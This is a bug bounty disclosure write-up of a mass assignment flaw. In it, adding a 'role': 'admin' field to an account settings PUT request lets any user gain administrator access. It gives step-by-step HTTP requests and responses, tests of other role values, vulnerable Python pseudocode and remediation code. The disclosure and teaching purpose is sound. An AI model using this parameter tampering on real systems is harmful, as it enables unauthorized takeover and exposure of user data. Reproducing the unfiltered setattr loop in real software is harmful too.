# Broken Access Control — Horizontal Privilege Escalation via Role Parameter Manipulation

**Vulnerability Type:** Broken Access Control — Privilege Escalation
**Severity:** Critical (CVSS 3.1 Score: 9.1)<br>
**Platform:** Bug Bounty (Redacted)<br>
**Status:** Resolved / Disclosed<br>
**Date:** 2026<br> 

---

## Summary

A Broken Access Control vulnerability was discovered in a web application's account settings update endpoint. The API accepted a `role` parameter in the request body that was intended for internal use only. By including `"role": "admin"` in a standard profile update request, a regular authenticated user could escalate their own account privileges to administrator level — gaining access to the admin dashboard, user management panel, and all privileged application functions.

---

## Vulnerability Details

| Field | Details |
|---|---|
| Type | Broken Access Control — Vertical Privilege Escalation |
| Endpoint | `PUT /api/v1/account/settings` |
| Parameter | `role` (mass assignment vulnerability) |
| Impact | Full admin access for any authenticated user |
| Authentication Required | Yes (any valid user account) |
| CVSS Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

---

## Background: Mass Assignment

**Mass assignment** occurs when an application automatically binds HTTP request parameters to internal object properties without filtering which properties are safe to update. If a `User` model has a `role` field and the API blindly accepts all submitted fields, an attacker can set any property — including sensitive ones like `role`, `is_admin`, or `verified`.

---

## Steps to Reproduce

### 1. Intercept a normal profile update

Log in as a regular user and update your display name. Intercept the request in Burp Suite:

```
PUT /api/v1/account/settings HTTP/1.1
Host: redacted.com
Authorization: Bearer [user_token]
Content-Type: application/json

{
  "display_name": "Danish Abbas",
  "bio": "Security Researcher"
}
```

Response:

```json
{ "status": "updated", "display_name": "Danish Abbas" }
```

### 2. Add the role parameter

Resend the same request in Burp Repeater with an additional `role` field:

```
PUT /api/v1/account/settings HTTP/1.1
Host: redacted.com
Authorization: Bearer [user_token]
Content-Type: application/json

{
  "display_name": "Danish Abbas",
  "bio": "Security Researcher",
  "role": "admin"
}
```

Response:

```json
{ "status": "updated", "display_name": "Danish Abbas", "role": "admin" }
```

The server accepted the `role` field and updated it without any authorization check. The response confirmed the role change.

### 3. Access the admin dashboard

Navigate to `/admin/dashboard` — previously returning `403 Forbidden` for regular users:

```
GET /admin/dashboard HTTP/1.1
Host: redacted.com
Authorization: Bearer [same_user_token]
```

Response: `200 OK` — full admin dashboard rendered, including:
- Complete user list with emails and registration dates
- Ability to delete, suspend, or modify any user account
- Application configuration settings
- Server health and log viewer

### 4. Confirm the escalation via `/api/v1/me`

```
GET /api/v1/me HTTP/1.1
Authorization: Bearer [user_token]
```

```json
{
  "user_id": 1042,
  "email": "testuser@email.com",
  "display_name": "Danish Abbas",
  "role": "admin",
  "created_at": "2024-01-15"
}
```

The role change was persistent in the database, not just session-level.

### 5. Test additional role values

To understand the full scope, I also tested:

```json
{ "role": "superadmin" }  →  500 Internal Server Error (role didn't exist)
{ "role": "moderator"  }  →  200 OK — moderator privileges granted
{ "role": "staff"      }  →  200 OK — staff privileges granted
```

The application had multiple privilege levels, all accessible via the same parameter.

---

## Impact

- **Full account takeover platform-wide** — Any registered user could escalate to admin
- **User data exposure** — Admin panel exposed PII for all registered users
- **Account manipulation** — Ability to delete, suspend, or impersonate any user
- **Application configuration access** — Potential to modify server behavior, disable security features
- **Persistent privilege retention** — The role change survived logout and session rotation

---

## Root Cause

The server-side controller used mass assignment to update user properties, passing the entire request body directly to the ORM update method without filtering sensitive fields:

```python
# Vulnerable pseudocode (Django/similar ORM)
@api_view(['PUT'])
@require_auth
def update_settings(request):
    user = request.user
    # Dangerous: updates ALL fields in the request body including 'role'
    for key, value in request.data.items():
        setattr(user, key, value)
    user.save()
    return Response({"status": "updated"})
```

The `role` field existed on the User model and was not excluded from the mass update.

---

## Remediation

1. **Explicit field allowlisting** — Only update fields that users are permitted to change. Never pass request data directly to the ORM:
   ```python
   # Secure — explicit allowlist
   ALLOWED_FIELDS = ['display_name', 'bio', 'avatar_url']
   for key in ALLOWED_FIELDS:
       if key in request.data:
           setattr(user, key, request.data[key])
   user.save()
   ```
2. **Separate endpoints for privileged operations** — Role changes should only be possible through an admin-only endpoint with strict authorization checks, never through the user self-service settings endpoint.
3. **Server-side role authorization** — The server should verify that only administrators can modify the `role` field, regardless of what endpoint is called.
4. **Use serializers with strict field control** — In frameworks like Django REST Framework, define serializers that explicitly list writable fields:
   ```python
   class UserSettingsSerializer(serializers.ModelSerializer):
       class Meta:
           model = User
           fields = ['display_name', 'bio']  # role intentionally excluded
   ```
5. **Audit all update endpoints** — Review every PUT/PATCH endpoint in the application for similar mass assignment patterns.

---

## References

- [OWASP — Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [OWASP Top 10 — A01: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [HackTricks — Mass Assignment](https://book.hacktricks.xyz/pentesting-web/mass-assignment)

---

*This writeup is published for educational purposes. All testing was conducted within an authorized bug bounty program scope using a personal test account. Admin access was verified for proof-of-concept purposes only and no other user accounts were accessed or modified.*
